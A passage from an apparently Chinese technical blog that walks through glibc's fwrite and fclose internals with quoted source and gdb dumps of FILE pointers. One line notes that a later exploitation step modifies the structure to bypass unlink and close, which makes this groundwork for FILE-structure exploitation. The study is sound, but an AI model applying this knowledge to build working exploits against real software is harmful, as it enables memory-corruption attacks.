f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class="line">      if (count &gt;= n)</span><br><span class="line">&#123;</span><br><span class="line">  const char *p;</span><br><span class="line">  for (p = s + n; p &gt; s; )</span><br><span class="line">    &#123;</span><br><span class="line">      if (*--p == &apos;\n&apos;)</span><br><span class="line">&#123;</span><br><span class="line">  count = p - s + 1;</span><br><span class="line">  must_flush = 1;</span><br><span class="line">  break;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  else if (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; /* Space available. */</span><br></pre></td></tr></table></figure></p><p>这一段判断了缓冲区剩余的空间，存在了count中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/* Then fill the buffer. */</span><br><span class="line"> if (count &gt; 0)</span><br><span class="line">   &#123;</span><br><span class="line">     if (count &gt; to_do)</span><br><span class="line">count = to_do;</span><br><span class="line">     f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">     s += count;</span><br><span class="line">     to_do -= count;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p><p>如果缓冲区还有剩余，则将数据拷贝至输出缓冲区。并计算是否还有目标输出剩余<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> if (to_do + must_flush &gt; 0)</span><br><span class="line">   &#123;</span><br><span class="line">     size_t block_size, do_write;</span><br><span class="line">     /* Next flush the (full) buffer. */</span><br><span class="line">     if (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line">/* If nothing else has to be written we must not signal the</span><br><span class="line">   caller that everything has been written.  */</span><br><span class="line">return to_do == 0 ? EOF : n - to_do;</span><br></pre></td></tr></table></figure></p><h3 id="IO-OVERFLOW-gt-IO-new-file-overflow"><a href="#IO-OVERFLOW-gt-IO-new-file-overflow" class="headerlink" title="_IO_OVERFLOW-&gt;_IO_new_file_overflow"></a>_IO_OVERFLOW-&gt;_IO_new_file_overflow</h3><p>如果还有剩余，则说明缓冲区未建立或已经满了，需要使用_IO_OVERFLOW刷新缓冲区。跟进该函数，是位于fileops.c中的_IO_new_file_overflow<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">_IO_new_file_overflow (_IO_FILE *f, int ch)</span><br></pre></td></tr></table></figure></p><p>继续跟进，先检查是否有_IO_NO_WRITE标志位<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */</span><br><span class="line">  &#123;</span><br><span class="line">    f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">    __set_errno (EBADF);</span><br><span class="line">    return EOF;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>检查_IO_write_base是否为空，若为空则分配输出缓冲区。这里调用的是_IO_doallocbuf来分配，与fread中相同。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)</span><br><span class="line">   &#123;</span><br><span class="line">     /* Allocate a buffer if needed. */</span><br><span class="line">     if (f-&gt;_IO_write_base == NULL)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_doallocbuf (f);</span><br><span class="line">  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>跟进_IO_setg，是一句宏，将与read相关的三个指针赋值为_IO_buf_base<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define _IO_setg(fp, eb, g, eg)  ((fp)-&gt;_IO_read_base = (eb),\</span><br><span class="line">(fp)-&gt;_IO_read_ptr = (g), (fp)-&gt;_IO_read_end = (eg))</span><br></pre></td></tr></table></figure></p><p>可以看下修改结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">_IO_read_ptr = 0x603480 &quot;&quot;, </span><br><span class="line">_IO_read_end = 0x603480 &quot;&quot;, </span><br><span class="line">_IO_read_base = 0x603480 &quot;&quot;, </span><br><span class="line">_IO_write_base = 0x0, </span><br><span class="line">_IO_write_ptr = 0x0, </span><br><span class="line">_IO_write_end = 0x0, </span><br><span class="line">_IO_buf_base = 0x603480 &quot;&quot;, </span><br><span class="line">_IO_buf_end = 0x604480 &quot;&quot;,</span><br></pre></td></tr></table></figure></p><p>再之后就是相关指针的设置，对读写相关的指针与flags等进行了赋值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">_flags = -72536956,   --&gt; 0xfbad2c84</span><br><span class="line">_IO_read_ptr = 0x603480 &quot;&quot;, </span><br><span class="line">_IO_read_end = 0x603480 &quot;&quot;, </span><br><span class="line">_IO_read_base = 0x603480 &quot;&quot;, </span><br><span class="line">_IO_write_base = 0x603480 &quot;&quot;, </span><br><span class="line">_IO_write_ptr = 0x603480 &quot;&quot;, </span><br><span class="line">_IO_write_end = 0x604480 &quot;&quot;, </span><br><span class="line">_IO_buf_base = 0x603480 &quot;&quot;, </span><br><span class="line">_IO_buf_end = 0x604480 &quot;&quot;,</span><br></pre></td></tr></table></figure></p><p>赋值之后就要开始调用_IO_do_write函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == &apos;\n&apos;))</span><br><span class="line">    if (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      return EOF;</span><br></pre></td></tr></table></figure></p><h3 id="IO-do-write-gt-IO-new-do-write"><a href="#IO-do-write-gt-IO-new-do-write" class="headerlink" title="_IO_do_write-&gt;_IO_new_do_write"></a>_IO_do_write-&gt;_IO_new_do_write</h3><p>跟进调用了fileops.c中的_IO_new_do_write<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">_IO_new_do_write (FILE *fp, const char *data, size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  return (to_do == 0</span><br><span class="line">  || (size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_do_write, _IO_do_write)</span><br></pre></td></tr></table></figure></p><h3 id="new-do-write"><a href="#new-do-write" class="headerlink" title="new_do_write"></a>new_do_write</h3><p>看到主要调用了new_do_write函数，位于该函数下方。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">static size_t</span><br><span class="line">new_do_write (FILE *fp, const char *data, size_t to_do)</span><br></pre></td></tr></table></figure></p><p>看到刚开始进行了标志位的判断，然后看read_end与write_base是否存在偏移，有则调用_IO_SYSSEEK校正指针位置。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> if (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">   /* On a system without a proper O_APPEND implementation,</span><br><span class="line">      you would need to sys_seek(0, SEEK_END) here, but is</span><br><span class="line">      not needed nor desirable for Unix- or Posix-like systems.</span><br><span class="line">      Instead, just indicate that offset (before and after) is</span><br><span class="line">      unpredictable. */</span><br><span class="line">   fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line"> else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">   &#123;</span><br><span class="line">     off64_t new_pos</span><br><span class="line">= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1);</span><br><span class="line">     if (new_pos == _IO_pos_BAD)</span><br><span class="line">return 0;</span><br><span class="line">     fp-&gt;_offset = new_pos;</span><br><span class="line">   &#125;</span><br><span class="line"> if (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">     fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - 1, data, count) + 1;</span><br></pre></td></tr></table></figure></p><p>之后调用_IO_SYSWRITE输出输出缓冲区的内容。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">count = _IO_SYSWRITE (fp, data, to_do);</span><br></pre></td></tr></table></figure></p><h3 id="IO-SYSWRITE-gt-IO-new-file-write"><a href="#IO-SYSWRITE-gt-IO-new-file-write" class="headerlink" title="_IO_SYSWRITE-&gt;_IO_new_file_write"></a>_IO_SYSWRITE-&gt;_IO_new_file_write</h3><p>跟进_IO_SYSWRITE查看输出缓冲区的内容是怎样被输出的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">ssize_t</span><br><span class="line">_IO_new_file_write (FILE *f, const void *data, ssize_t n)</span><br><span class="line">&#123;</span><br><span class="line">  ssize_t to_do = n;</span><br><span class="line">  while (to_do &gt; 0)</span><br><span class="line">    &#123;</span><br><span class="line">      ssize_t count = (__builtin_expect (f-&gt;_flags2</span><br><span class="line">                                         &amp; _IO_FLAGS2_NOTCANCEL, 0)</span><br><span class="line">   ? __write_nocancel (f-&gt;_fileno, data, to_do)</span><br><span class="line">   : __write (f-&gt;_fileno, data, to_do));</span><br><span class="line">      if (count &lt; 0)</span><br><span class="line">&#123;</span><br><span class="line">  f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">  break;</span><br><span class="line">&#125;</span><br><span class="line">      to_do -= count;</span><br><span class="line">      data = (void *) ((char *) data + count);</span><br><span class="line">    &#125;</span><br><span class="line">  n -= to_do;</span><br><span class="line">  if (f-&gt;_offset &gt;= 0)</span><br><span class="line">    f-&gt;_offset += n;</span><br><span class="line">  return n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到执行了系统调用__write来将其输出。</p><p>返回之后调用_IO_setg刷新缓冲区指针并返回。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= 0</span><br><span class="line">       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  return count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>返回到_IO_new_file_xsputn中继续往后走，计算了buf是否为比较大的block（0x1000），如果是则直接调用new_do_write进行输出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">     /* Try to maintain alignment: write a whole number of blocks.  */</span><br><span class="line">     block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;</span><br><span class="line">     do_write = to_do - (block_size &gt;= 128 ? to_do % block_size : 0);</span><br><span class="line"></span><br><span class="line">     if (do_write)</span><br><span class="line">&#123;</span><br><span class="line">  count = new_do_write (f, s, do_write);</span><br><span class="line">  to_do -= count;</span><br><span class="line">  if (count &lt; do_write)</span><br><span class="line">    return n - to_do;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>最后处理缓冲区剩余数据，将剩余数据输出至输出缓冲区<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">     /* Now write out the remainder.  Normally, this will fit in the</span><br><span class="line"> buffer, but it&apos;s somewhat messier for line-buffered files,</span><br><span class="line"> so we let _IO_default_xsputn handle the general case. */</span><br><span class="line">     if (to_do)</span><br><span class="line">to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p><p>关于这里只将数据输出到输出缓冲区而没有将其写至文件，其实是主函数会调用 _IO_flush_all_lockp()函数来清空缓冲区，该函数会在下面三种情况下被调用：</p><p>1：当 libc 执行 abort 流程时。</p><p>2：当执行 exit 函数时。当执行流从 main 函数返回时</p><p>3：当执行流从 main 函数返回时</p><h3 id="IO-default-xsputn"><a href="#IO-default-xsputn" class="headerlink" title="_IO_default_xsputn"></a>_IO_default_xsputn</h3><p>这里调用的是_IO_default_xsputn，跟进该函数，跳转到genops.c中的_IO_default_xsputn<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">for (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      /* Space available. */</span><br><span class="line">      if (f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end)</span><br><span class="line">&#123;</span><br><span class="line">  size_t count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">  if (count &gt; more)</span><br><span class="line">    count = more;</span><br><span class="line">  if (count &gt; 20)</span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">      s += count;</span><br><span class="line">    &#125;</span><br><span class="line">  else if (count)</span><br><span class="line">    &#123;</span><br><span class="line">      char *p = f-&gt;_IO_write_ptr;</span><br><span class="line">      ssize_t i;</span><br><span class="line">      for (i = count; --i &gt;= 0; )</span><br><span class="line">*p++ = *s++;</span><br><span class="line">      f-&gt;_IO_write_ptr = p;</span><br><span class="line">    &#125;</span><br><span class="line">  more -= count;</span><br><span class="line">&#125;</span><br><span class="line">      if (more == 0 || _IO_OVERFLOW (f, (unsigned char) *s++) == EOF)</span><br><span class="line">break;</span><br><span class="line">      more--;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>这里对剩余大小不同进行了分别处理，如果大于20则调用__memcpy,否则使用for循环直接赋值。最后如果输出缓冲区为0，则直接调用_IO_OVERFLOW输出，之后返回，这个流程基本就结束了。最后看下此时的fp，bcede…是data2中的数据。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">_IO_read_ptr = 0x603480 &quot;bcdefghij1234567890&quot;, </span><br><span class="line">_IO_read_end = 0x603480 &quot;bcdefghij1234567890&quot;, </span><br><span class="line">_IO_read_base = 0x603480 &quot;bcdefghij1234567890&quot;, </span><br><span class="line">_IO_write_base = 0x603480 &quot;bcdefghij1234567890&quot;, </span><br><span class="line">_IO_write_ptr = 0x603494 &quot;&quot;, </span><br><span class="line">_IO_write_end = 0x604480 &quot;&quot;, </span><br><span class="line">_IO_buf_base = 0x603480 &quot;bcdefghij1234567890&quot;, </span><br><span class="line">_IO_buf_end = 0x604480 &quot;&quot;,</span><br></pre></td></tr></table></figure></p><h1 id="fclose"><a href="#fclose" class="headerlink" title="fclose"></a>fclose</h1><h2 id="框架-3"><a href="#框架-3" class="headerlink" title="框架"></a>框架</h2><p>主要是对链接入_IO_list_all中的FILE结构体，还有fread，fwrite建立的输入输出缓冲区进行释放处理。</p><h2 id="细节-3"><a href="#细节-3" class="headerlink" title="细节"></a>细节</h2><h3 id="fclose-gt-IO-new-fclose"><a href="#fclose-gt-IO-new-fclose" class="headerlink" title="fclose-&gt;_IO_new_fclose"></a>fclose-&gt;_IO_new_fclose</h3><p>跟进fclose，进入了iofclose.c中的_IO_new_fclose函数，开始先对fp进行了检查<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CHECK_FILE(fp, EOF);</span><br></pre></td></tr></table></figure></p><p>之后第一步：unlink，将fp从_IO_list_all中脱下。<br>这里需要注意下，在后面的利用中，为了能够直接调用_io_finish，会这里进行修改来绕过unlink与io_close</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  /* First unlink the stream.  */</span><br><span class="line">if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((struct _IO_FILE_plus *) fp);</span><br></pre></td></tr></table></figure><h4 id="IO-un-link"><a href="#IO-un-link" class="headerlink" title="_IO_un_link"></a>_IO_un_link</h4><p>跟进该函数，是位于genops.c中的_IO_un_link<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">_IO_un_link (struct _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  if (fp-&gt;file._flags &amp; _IO_LINKED)</span><br><span class="line">    &#123;</span><br><span class="line">      FILE **f;</span><br><span class="line">#ifdef _IO_MTSAFE_IO</span><br><span class="line">      _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">      _IO_lock_lock (list_all_lock);</span><br><span class="line">      run_fp = (FILE *) fp;</span><br><span class="line">      _IO_flockfile ((FILE *) fp);</span><br><span class="line">#endif</span><br><span class="line">      if (_IO_list_all == NULL)</span><br><span class="line">;</span><br><span class="line">      else if (fp == _IO_list_all)</span><br><span class="line">_IO_list_all = (struct _IO_FILE_plus *) _IO_list_all-&gt;file._chain;</span><br><span class="line">      else</span><br><span class="line">for (f = &amp;_IO_list_all-&gt;file._chain; *f; f = &amp;(*f)-&gt;_chain)</span><br><span class="line">  if (*f == (FILE *) fp)</span><br><span class="line">    &#123;</span><br><span class="line">      *f = fp-&gt;file._chain;</span><br><span class="line">      break;</span><br><span class="line">    &#125;</span><br><span class="line">      fp-&gt;file._flags &amp;= ~_IO_LINKED;</span><br><span class="line">#ifdef _IO_MTSAFE_IO</span><br><span class="line">      _IO_funlockfile ((FILE *) fp);</span><br><span class="line">      run_fp = NULL;</span><br><span class="line">      _IO_lock_unlock (list_all_lock);</span><br><span class="line">      _IO_cleanup_region_end (0);</span><br><span class="line">#endif</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_un_link)</span><br></pre></td></tr></table></figure></p><p>可以看到，开始时先检查标志位_flags，之后判断_IO_list_all是否为空，不为空看是否在表头，若不再表头则遍历_IO_list_all单链表进行寻找。最后对其标志位_flags进行修改，该标志位表明了是否位于_IO_list_all链表中。</p><p>返回之后，调用_IO_file_close_it函数关闭释放缓冲区</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (fp-&gt;_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);</span><br><span class="line">  else</span><br><span class="line">    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? -1 : 0;</span><br></pre></td></tr></table></figure><h4 id="IO-file-close-it"><a href="#IO-file-close-it" class="headerlink" title="_IO_file_close_it"></a>_IO_file_close_it</h4><p>跟进该函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">_IO_new_file_close_it (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  int write_status;</span><br><span class="line">  if (!_IO_file_is_open (fp))</span><br><span class="line">    return EOF;</span><br><span class="line"></span><br><span class="line">  if ((fp-&gt;_flags &amp; _IO_NO_WRITES) == 0</span><br><span class="line">      &amp;&amp; (fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) != 0)</span><br><span class="line">    write_status = _IO_do_flush (fp);</span><br><span class="line">  else</span><br><span class="line">    write_status = 0;</span><br><span class="line"></span><br><span class="line">  _IO_unsave_markers (fp);</span><br><span class="line"></span><br><span class="line">  int close_status = ((fp-&gt;_flags2 &amp; _IO_FLAGS2_NOCLOSE) == 0</span><br><span class="line">      ? _IO_SYSCLOSE (fp) : 0);</span><br><span class="line"></span><br><span class="line">  /* Free buffer. */</span><br><span class="line">  if (fp-&gt;_mode &gt; 0)</span><br><span class="line">    &#123;</span><br><span class="line">      if (_IO_have_wbackup (fp))</span><br><span class="line">_IO_free_wbackup_area (fp);</span><br><span class="line">      _IO_wsetb (fp, NULL, NULL, 0);</span><br><span class="line">      _IO_wsetg (fp, NULL, NULL, NULL);</span><br><span class="line">      _IO_wsetp (fp, NULL, NULL);</span><br><span class="line">    &#125;</span><br><span class="line">  _IO_setb (fp, NULL, NULL, 0);</span><br><span class="line">  _IO_setg (fp, NULL, NULL, NULL);</span><br><span class="line">  _IO_setp (fp, NULL, NULL);</span><br><span class="line"></span><br><span class="line">  _IO_un_link ((struct _IO_FILE_plus *) fp);</span><br><span class="line">  fp-&gt;_flags = _IO_MAGIC|CLOSED_FILEBUF_FLAGS;</span><br><span class="line">  fp-&gt;_fileno = -1;</span><br><span class="line">  fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line"></span><br><span class="line">  return close_status ? close_status : write_status;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_close_it, _IO_file_close_it)</span><br></pre></td></tr></table></figure></p><p>首先通过标志位_fileno 判断了文件是否打开，然后对其标志位进行了判断，目的是判断是否为输出缓冲区，是则调用_IO_do_flush刷新缓冲区。查看_IO_do_flush，发现是宏定义<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#define _IO_do_flush(_f) \</span><br><span class="line">  ((_f)-&gt;_mode &lt;= 0      \</span><br><span class="line">   ? _IO_do_write(_f, (_f)-&gt;_IO_write_base,      \</span><br><span class="line">  (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)      \</span><br><span class="line">   : _IO_wdo_write(_f, (_f)-&gt;_wide_data-&gt;_IO_write_base,      \</span><br><span class="line">   ((_f)-&gt;_wide_data-&gt;_IO_write_ptr      \</span><br><span class="line">    - (_f)-&gt;_wide_data-&gt;_IO_write_base)))</span><br></pre></td></tr></table></figure></p><p>可以看到主要调用_IO_do_write将输出缓冲区输出。此时原先在输出缓冲区中的值才会被写入文件，所以一般程序运行中没有close的话打开文件可能会发现还没有写进去就是这个原因。再之后对_markers标志位进行了处理。然后可以看到后面调用了_IO_SYSCLOSE函数，看到是fileops.c中的_IO_file_close</p><h4 id="IO-SYSCLOSE-gt-IO-file-close"><a href="#IO-SYSCLOSE-gt-IO-file-close" class="headerlink" title="_IO_SYSCLOSE-&gt;_IO_file_close"></a>_IO_SYSCLOSE-&gt;_IO_file_close</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">_IO_file_close (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  /* Cancelling close should be avoided if possible since it leaves an</span><br><span class="line">     unrecoverable state behind.  */</span><br><span class="line">  return close_not_cancel (fp-&gt;_fileno);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_file_close)</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">看到主要调用了close_not_cancel，而它本身是个宏定义，</span><br></pre></td></tr></table></figure><p>#define close_not_cancel(fd) \<br>    __close (fd)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">实际就是通过系统调用__close关闭</span><br><span class="line"></span><br><span class="line">返回之后,调用_IO_setb/_IO_setg/_IO_setp，其中_IO_setb是设置结构体的buf指针， _IO_setg是设置read相关的指针，_IO_setp是设置write相关的指针</span><br></pre></td></tr></table></figure></p><p>  _IO_setb (fp, NULL, NULL, 0);<br>  _IO_setg (fp, NULL, NULL, NULL);<br>  _IO_setp (fp, NULL, NULL);<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td 